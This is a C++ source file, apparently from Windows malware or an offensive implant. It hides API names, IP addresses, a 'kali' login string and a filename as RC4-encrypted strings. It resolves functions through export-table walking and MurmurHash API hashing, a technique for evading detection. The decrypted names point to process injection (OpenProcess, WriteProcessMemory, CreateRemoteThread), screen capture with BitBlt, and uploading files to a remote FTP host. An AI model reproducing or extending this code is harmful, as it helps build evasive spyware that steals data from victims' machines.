#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <shlwapi.h>
#include <string.h> 
#include "RSA.h"
//#include "memory.h"

#pragma comment(lib, "Shlwapi.lib")
#define STATIC static
#define HASHING_SEED 23341
#define mmix(h,k) { k *= m; k ^= k >> r; k *= m; h *= m; h ^= k; }
#define LowerChar(C) if (C >= 'A' && C <= 'Z') {C = C + ('a'-'A');}

#define LoadLibraryA_Base64 "IuEukSACOU4WbVIpAMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwMAAAAzMzMzA=="
#define Sleep_Base64 "PeIqkBwAzMzMzMzMzMzMzMzMzMzMzMzM"
#define GetProcAddress_Base64 "Kes7pR4EOH0Te1kNwUE7AMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwPAAAAzMzMzMzMzMzMzMzM"
#define WriteProcMem_Base64 "OfwmgQk7KVMUelgb_1dWfrUapwDMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwTAAAAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzA=="
#define CreateRemoteThread_Base64 "LfwqlBgOCVkacF8N5lpJdKYHpwDMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwTAAAAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzA=="
#define OpenProc_Base64 "If4qmzwZNF8SbFhoVGhyZWFkAADMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzM"
#define VirtualAlloc_Base64 "OOc9gRkKN30bc0QL90o7AMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwPAAAAzMzMzMzMzMzMzMzM"
#define InternetOpenA_Base64 "J-A7kB4FPkg4b04G8wDMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwNAAAAzMzMzMzMzMw="
#define InternetConnectA_Base64 "J-A7kB4FPkg0cEUG11FPUMcAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwRAAAAzMzMzMzMzMzMzMzMzMzMzMzMzMw="
#define FtpPutFileA_Base64 "KPo_pRkfHVUbempoAMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwMAAAA"
#define InternetCloseHandle_Base64 "J-A7kB4FPkg0c0Qb13paf6MPwigAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwUAAAAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMw="
#define BitBlt_Base64 "LOc7twAfAMzMzMzMzMzMzMzMzMzMzMzMzMzMzA=="
#define ntdll_Base64 "APormQBFP1AbHwDMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzA=="
#define kernel32_Base64 "Bes9mwkHaA5Ze0cEAMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwMAAAAzMzMzA=="
#define user32_Hash "G_0qh19ZdVgbcwDMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMw="
#define wininet_Hash "GechnAIOLxITc0cAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwLAAAA"
#define gdi32_Hash "Ceomxl5FP1AbAMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzA=="
#define ip_addr_Hash "X7d9211dYxJHMRpRhADMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwNAAAAzMzMzMzMzMw="
#define _192_168_0_198_Hash "X7d9211dYxJHMRpRigDMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwNAAAAzMzMzMzMzMw="
#define _192_168_0_104_Hash "X7d9211dYxJHMRpYhgDMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwNAAAAzMzMzMzMzMw="
#define _192_168_0_105_Hash "X7d9211dYxJHMRpYhwDMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwNAAAAzMzMzMzMzMw="
#define _192_168_0_103_Hash "X7d9211dYxJHMRpYgQDMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwNAAAAzMzMzMzMzMw="
#define _192_168_5_137 "X7d9211dYxJCMRpbhQDMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwNAAAAzMzMzMzMzMw="
#define kali_Hash "Be8jnADMzMzMzMzMzMzMzMzMzMw="
#define localfile_Hash "He09kAkFdVYHekwAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwLAAAA"
#define ftpCommand_Hash "PdoApwDMzMzMzMzMzMzMzMzMzMw="
#define LdrLoadDll_Base64 "Iuo9uQMKP3gbcysAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMw="
#define Rtl_Base64 "PPojvAICL2kZdkgH1ldoZbUKyU8MAMzMzMzMzMzMzMzMzMzMzMzMzMzMzMwVAAAAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzM"

char kernel32[] = "123456789012";
char user32[] = "1234567890";
char wininet[] = "12345678901";
char gdi32[] = "123456789";
char ip_addr[] = "1234567890123";
char kali[] = "1234";
char localfile[] = "12345678901";
char ftpCmd[] = "1234";
char ntdll[] = "1234567890";
char LdrLoadDll[] = "12345678901";
char ob_LoadLibA[] = "123456789012";
char ob_sleep[] = "12345";
char ob_GetProcAddr[] = "123456789012345";
char ob_WriteProcessMemory[] = "1234567890123456789";
char ob_CreateRemoteThread[] = "1234567890123456789";
char ob_OpenProcess[] = "123456789012";
char ob_VirtualAlloc[] = "123456789012345";
char ob_InternetOpenA[] = "1234567890123";
char ob_InternetConnectA[] = "1234567890123";
char ob_FtpPutFileA[] = "123456789012";
char ob_InternetCloseHandle[] = "12345678901234567890";
char ob_BitBlt[] = "123456";
char cus_RtlInitUnicodeString[] = "123456789012345678901";

typedef enum STRING_COUNT {
	kernel32_number_of_string = 12,
	user32_number_of_string = 10,
	wininet_number_of_string = 11,
	gdi32_number_of_string = 9,
	ip_number_of_string = 13,
	kali_number_of_string = 4,
	localfile_number_of_string = 11,
	ftpCommand_number_of_string = 4,
	LoadLibA_number_of_string = 12,
	Sleep_number_of_string = 5,
	GetProcAddress_number_of_string = 15,
	WriteProcessMemory_number_of_string = 19,
	CreateRemoteThread_number_of_string = 19,
	OpenProcess_number_of_string = 12,
	VirtualAllocEx_number_of_string = 15,
	InternetOpenA_number_of_string = 13,
	InternetConnectA_number_of_string = 17,
	FtpPutFileA_number_of_string = 12,
	InternetCloseHandle_number_of_string = 20,
	BitBlt_number_of_string = 6,
	ntdll_number_of_string = 10,
	LdrLoadDll_number_of_string = 11,
	Rtl_number_of_string = 21
};

void obfucation_string() {
	char* k32_temp = R4((char*)my_secret_key, (char*)kernel32_Base64, (char*)kernel32, kernel32_number_of_string);
	char* user32_temp = R4((char*)my_secret_key, (char*)user32_Hash, (char*)user32, user32_number_of_string);
	char* wininet_temp = R4((char*)my_secret_key, (char*)wininet_Hash, (char*)wininet, wininet_number_of_string);
	char* gdi32_temp = R4((char*)my_secret_key, (char*)gdi32_Hash, (char*)gdi32, gdi32_number_of_string);
	char* ip_addr_temp = R4((char*)my_secret_key, (char*)(_192_168_5_137), (char*)ip_addr, ip_number_of_string);
	char* kali_temp = R4((char*)my_secret_key, (char*)kali_Hash, (char*)kali, kali_number_of_string);
	char* localfile_temp = R4((char*)my_secret_key, (char*)localfile_Hash, (char*)localfile, localfile_number_of_string);
	char* ftpCommand_temp = R4((char*)my_secret_key, (char*)ftpCommand_Hash, (char*)ftpCmd, ftpCommand_number_of_string);
	char* loadlibA_temp = R4((char*)my_secret_key, (char*)LoadLibraryA_Base64, (char*)ob_LoadLibA, LoadLibA_number_of_string);
	char* sleep_temp = R4((char*)my_secret_key, (char*)Sleep_Base64, (char*)ob_sleep, Sleep_number_of_string);
	char* GetProcAddr_temp = R4((char*)my_secret_key, (char*)GetProcAddress_Base64, (char*)ob_GetProcAddr, GetProcAddress_number_of_string);
	char* WriteProcMem_temp = R4((char*)my_secret_key, (char*)WriteProcMem_Base64, (char*)ob_WriteProcessMemory, WriteProcessMemory_number_of_string);
	char* CreateRetThrd_temp = R4((char*)my_secret_key, (char*)CreateRemoteThread_Base64, (char*)ob_CreateRemoteThread, CreateRemoteThread_number_of_string);
	char* OpenProc_temp = R4((char*)my_secret_key, (char*)OpenProc_Base64, (char*)ob_OpenProcess, OpenProcess_number_of_string);
	char* VAllocEx_temp = R4((char*)my_secret_key, (char*)VirtualAlloc_Base64, (char*)ob_VirtualAlloc, VirtualAllocEx_number_of_string);
	char* InternetOpenA_temp = R4((char*)my_secret_key, (char*)InternetOpenA_Base64, (char*)ob_InternetOpenA, InternetOpenA_number_of_string);
	char* InternetConnectA_temp = R4((char*)my_secret_key, (char*)InternetConnectA_Base64, (char*)ob_InternetConnectA, InternetConnectA_number_of_string);
	char* FtpPutFileA_temp = R4((char*)my_secret_key, (char*)FtpPutFileA_Base64, (char*)ob_FtpPutFileA, FtpPutFileA_number_of_string);
	char* InternetCloseHandle_temp = R4((char*)my_secret_key, (char*)InternetCloseHandle_Base64, (char*)ob_InternetCloseHandle, InternetCloseHandle_number_of_string);
	char* BitBlt_temp = R4((char*)my_secret_key, (char*)BitBlt_Base64, (char*)ob_BitBlt, BitBlt_number_of_string);
	char* ntdll_temp = R4((char*)my_secret_key, (char*)ntdll_Base64, (char*)ntdll, ntdll_number_of_string);
	char* LdrLoadDll_temp = R4((char*)my_secret_key, (char*)LdrLoadDll_Base64, (char*)LdrLoadDll, LdrLoadDll_number_of_string);
	char* Rtl_temp = R4((char*)my_secret_key, (char*)Rtl_Base64, (char*)cus_RtlInitUnicodeString, Rtl_number_of_string);
}

STATIC INT Strlen(__in const char* Str) {
	INT length = 0;
	while (*Str) {
		length++;
		Str++;
	}
	return length;
	return length;
}

DWORD getHashFromString(char* data) {
	DWORD hash = 0x35;
	for (DWORD i = 0; i < strlen(data); i++) {
		hash = hash + data[i] + (hash << 1);
	}
	return hash;
}

int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
	_wcslwr_s(substr, MAX_PATH);
	_wcslwr_s(mystr, MAX_PATH);

	int result = 0;
	if (StrStrW(mystr, substr) != NULL) {
		result = 1;
	}

	return result;
}


FARPROC myGetProcAddressA(HMODULE hModule, LPCSTR lpProcName) {
  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
  PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + 
  ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

  DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
  WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
  DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);

  for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
    if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
      return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
    }
  }

  return NULL;
}

typedef NTSTATUS(NTAPI* pLdrLoadDll) (
	PWCHAR PathToFile,
	ULONG Flags,
	PUNICODE_STRING ModuleFileName,
	PHANDLE ModuleHandle
	);

unsigned int MurmurHash2A(const void* key, int len, unsigned int seed)
{
	char temp[64];
	RtlSecureZeroMemory(temp, 64);
	memcpy(temp, (PVOID)key, len);

	for (int i = 0; i < len; i++) {
		LowerChar(temp[i]);
	}

	const unsigned int m = 0x5bd1e995;
	const int r = 24;
	unsigned int l = len;

	const unsigned char* data = (const unsigned char*)temp;

	unsigned int h = seed;
	unsigned int k;

	while (len >= 4)
	{
		k = *(unsigned int*)data;

		mmix(h, k);

		data += 4;
		len -= 4;
	}

	unsigned int t = 0;

	switch (len)
	{
	case 3: t ^= data[2] << 16;
	case 2: t ^= data[1] << 8;
	case 1: t ^= data[0];
	};

	mmix(h, t);
	mmix(h, l);

	h ^= h >> 13;
	h *= m;
	h ^= h >> 15;

	return h;
}



PDWORD getAPIAddr(char* library, DWORD hash) {
	PDWORD functionAddress = (PDWORD)0;

	HMODULE libraryBase = LoadLibraryA(library);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

	PDWORD addressOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++) {
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;

		//DWORD functionNameHash = getHashFromString(functionName);
		DWORD functionNameHash = MurmurHash2A(functionName, Strlen(functionName), HASHING_SEED);

		if (functionNameHash == hash) {
			functionAddressRVA = addressOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			//printf("%s: 0x%x : %p\n", functionName, functionNameHash, functionAddress);
			return functionAddress;
		}
	}
}



